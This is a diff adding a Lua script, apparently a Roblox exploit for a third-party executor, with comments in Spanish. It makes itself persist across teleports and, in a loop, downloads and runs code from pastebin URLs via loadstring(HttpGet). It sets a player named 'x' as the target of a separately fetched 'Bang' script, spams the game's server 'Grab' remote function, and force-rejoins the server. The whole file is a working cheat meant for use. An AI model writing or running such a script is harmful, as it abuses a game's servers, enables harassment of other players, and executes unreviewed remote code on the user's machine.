@@ -1,0 +1,67 @@
+-- =========================================================
+-- SISTEMA DE PERSISTENCIA (QUEUE ON TELEPORT)
+-- =========================================================
+local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport
+if queueteleport then
+    queueteleport([[
+        task.spawn(function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/ga9KKa1B"))()
+        end)
+    ]])
+end
+
+-- =========================================================
+-- SERVICIOS Y VARIABLES
+-- =========================================================
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Rutas de funciones remotas del Grab (Con esperas eficientes de 5s)
+local _pkg_original = ReplicatedStorage:WaitForChild("Packages", 5)
+local _gR_original = _pkg_original and _pkg_original:FindFirstChild("Knit") and _pkg_original.Knit:FindFirstChild("Services"):FindFirstChild("CombatService"):FindFirstChild("RF"):FindFirstChild("Grab")
+
+local _pkg_nueva = ReplicatedStorage:WaitForChild("OldPackages", 5)
+local _gR_nueva = _pkg_nueva and _pkg_nueva:FindFirstChild("Knit") and _pkg_nueva.Knit:FindFirstChild("Services"):FindFirstChild("CombatService"):FindFirstChild("RF"):FindFirstChild("Grab")
+
+-- =========================================================
+-- BUCLE PRINCIPAL (MÁXIMA VELOCIDAD DE ENTRADA, REJOIN SEGURO)
+-- =========================================================
+task.spawn(function()
+    while true do
+        -- 1. Configuramos el objetivo y nos aseguramos de que el movimiento esté activado
+        getgenv().ObjetivoBang = "x"
+        getgenv().DetenerBang = false
+
+        -- 2. Ejecutamos el script del Bang aparte usando Loadstring
+        -- (Asegúrate de cambiar el link por tu propio pastebin si lo subes)
+        task.spawn(function()
+            pcall(function()
+                loadstring(game:HttpGet("https://pastebin.com/raw/T5Q12QA3"))()
+            end)
+        end)
+        
+        -- 3. Spam de Grab optimizado
+        local startTime = tick()
+        while tick() - startTime < 3 do
+            if _gR_original then task.defer(function() pcall(function() _gR_original:InvokeServer() end) end) end
+            if _gR_nueva then task.defer(function() pcall(function() _gR_nueva:InvokeServer() end) end) end
+            
+            task.wait() 
+        end
+        
+        -- 4. Detener movimiento (Le decimos al otro script que se apague)
+        getgenv().DetenerBang = true
+        
+        -- 5. TIEMPO CRÍTICO para que actúe la animación
+        task.wait(3.3)
+        
+        -- 6. Rejoin seguro
+        pcall(function()
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+        end)
+        
+        task.wait(0) -- Pausa infinita mientras recarga
+    end
+end)
